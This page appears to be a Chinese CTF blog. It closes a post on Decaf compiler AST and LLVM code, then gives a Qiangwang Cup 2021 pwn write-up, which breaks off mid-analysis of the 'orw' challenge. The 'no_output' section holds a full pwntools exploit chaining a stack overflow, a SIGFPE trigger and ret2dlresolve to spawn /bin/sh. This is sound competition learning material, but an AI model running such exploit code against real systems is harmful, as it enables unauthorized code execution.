class="params">(decafEXFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafEXFuncDefList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafEXFuncDef*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafEXFuncDef *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafEXFuncDef *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafVarList *FieldDeclList;</span><br><span class="line">	decafFuncDefList *MethodDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">PackageAST</span>(string name, decafVarList *fieldlist, decafFuncDefList *methodlist) </span><br><span class="line">		: <span class="built_in">Name</span>(name), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">MethodDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">PackageAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (MethodDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> MethodDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Package&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(MethodDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">		TheModule-&gt;<span class="built_in">setModuleIdentifier</span>(llvm::<span class="built_in">StringRef</span>(Name)); </span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != FieldDeclList) &#123;</span><br><span class="line">			val = FieldDeclList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != MethodDeclList) &#123;</span><br><span class="line">			val = MethodDeclList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="comment">// Q: should we enter the class name into the symbol table?</span></span><br><span class="line">		<span class="keyword">return</span> val; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafIF</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafBlock * Block2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafIF</span>(decafAllexp * Exp,decafBlock * Block,decafBlock * Block2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">Block2</span>(Block2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;IfStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block2) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafWhile</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafWhile</span>(decafAllexp * Exp,decafBlock * Block): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;WhileStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFor</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafAssignList *List;</span><br><span class="line">	decafAssignList *List2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafFor</span>(decafAllexp * Exp,decafBlock * Block,decafAssignList *List,decafAssignList *List2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">List</span>(List),<span class="built_in">List2</span>(List2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ForStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(List)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(List2)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafReturn</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafBinexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafReturn</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">decafReturn</span>(decafBinexp * Exp)&#123; </span><br><span class="line">		<span class="keyword">this</span>-&gt;Exp = Exp;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">decafBinexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ReturnStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProgramAST - the decaf program</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProgramAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafEXFuncDefList *ExternList;</span><br><span class="line">	PackageAST *PackageDef;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">ProgramAST</span>(decafEXFuncDefList *externs, PackageAST *c) : <span class="built_in">ExternList</span>(externs), <span class="built_in">PackageDef</span>(c) &#123;&#125;</span><br><span class="line">	~<span class="built_in">ProgramAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (ExternList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> ExternList; &#125; </span><br><span class="line">		<span class="keyword">if</span> (PackageDef != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> PackageDef; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Program&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(ExternList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(PackageDef) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != ExternList) &#123;</span><br><span class="line">			val = ExternList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != PackageDef) &#123;</span><br><span class="line">			val = PackageDef-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="built_in">runtime_error</span>(<span class="string">&quot;no package definition in decaf program&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> val; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最终拿到了满分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Correct(dev): <span class="number">100</span> / <span class="number">100</span></span><br><span class="line">Score(dev): <span class="number">100.00</span></span><br><span class="line">Total Score: <span class="number">100.00</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/03/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2021/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/03/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2021/" class="post-title-link" itemprop="url">强网杯CTF2021</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-07-03 17:03:05 / Modified: 17:07:20" itemprop="dateCreated datePublished" datetime="2023-07-03T17:03:05+08:00">2023-07-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>46k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>41 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="no-output"><a href="#no-output" class="headerlink" title="no_output"></a>no_output</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=<span class="number">42055570b</span>c1508252eacc21b95b83f8c002483eb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>32位，dynamically，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>简单栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read_s</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);                  <span class="comment">// 栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>strcpy 会将字符串末尾置空，导致 fdg 被设置为“0”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(nameg, name);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用 strcpy 的溢出覆盖 fdg 为“0”，通过第二次输入绕过程序的字符串匹配检查</p>
<p>接着就要考虑如何触发浮点异常信号 SIGFPE：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="string">&quot;give me the soul:&quot;</span>;</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, soul);</span><br><span class="line">v2 = <span class="string">&quot;give me the egg:&quot;</span>;</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;egg);</span><br><span class="line"><span class="keyword">if</span> ( egg )</span><br><span class="line">&#123;</span><br><span class="line">  signal(<span class="number">8</span>, (<span class="keyword">__sighandler_t</span>)read_s);</span><br><span class="line">  soul[<span class="number">1</span>] = soul[<span class="number">0</span>] / egg;</span><br><span class="line">  signal(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于除号两边都是 int 类型，因此 <code>-0x80000000/-1</code> 就会触发漏洞（<code>-0x80000000/-1</code> 的计算结果为 <code>0x80000000</code>，其值为负数，导致符号位溢出）</p>
<p>由于没法泄露，因此只能打 ret2dlresolve</p>
<p>对于32位无 PIE 保护的程序，在 pwntools 中有比较成熟的 ret2dlresolve 工具，直接拿来用就好了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&#x27;./test&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x8049268&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sl(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;hello_boy&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;-2147483648&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804C080</span>+<span class="number">0x200</span></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"></span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">sl(flat([&#123;<span class="number">76</span>:raw_rop&#125;]))</span><br><span class="line">sl(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>)</span> stable release version 2.23, by Roland McGrath et al.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">02</span>a3c09af5900983d07486d2b3310dffcebfde86, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，PIE</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单，只能打 ORW</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>index 缺乏检查，导致 chunk_list 可以向上溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chunk_list[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>程序的限制比较多：</p>
<ul>
<li>add 可以执行2次，dele 可以执行1次</li>
<li>每次输入的 size 大小不超过8字节，index 大小不超过1（可以为负数）</li>
</ul>
<p>由于 index 可以为负数，可以尝试向上溢出，能够劫持的地方只有两处：GOT，IO_FILE</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">98</span>:<span class="number">04</span>c0│  <span class="number">0x564531002060</span> (<span class="built_in">malloc</span>@got.plt) —▸ <span class="number">0x7fa488599180</span> (<span class="built_in">malloc</span>) ◂— push   rbp</span><br><span class="line"><span class="number">99</span>:<span class="number">04</span>c8│  <span class="number">0x564531002068</span> (setvbuf@got.plt) —▸ <span class="number">0x7fa488584e80</span> (setvbuf) ◂— push   rbp</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a2:<span class="number">0510</span>│  <span class="number">0x5645310020b0</span> —▸ <span class="number">0x7fa4888d98e0</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line">a3:<span class="number">0518</span>│  <span class="number">0x5645310020b8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>往 GOT 写入堆地址似乎没有什么用，劫持 IO_FILE 的话输入的字节数又太少</p>
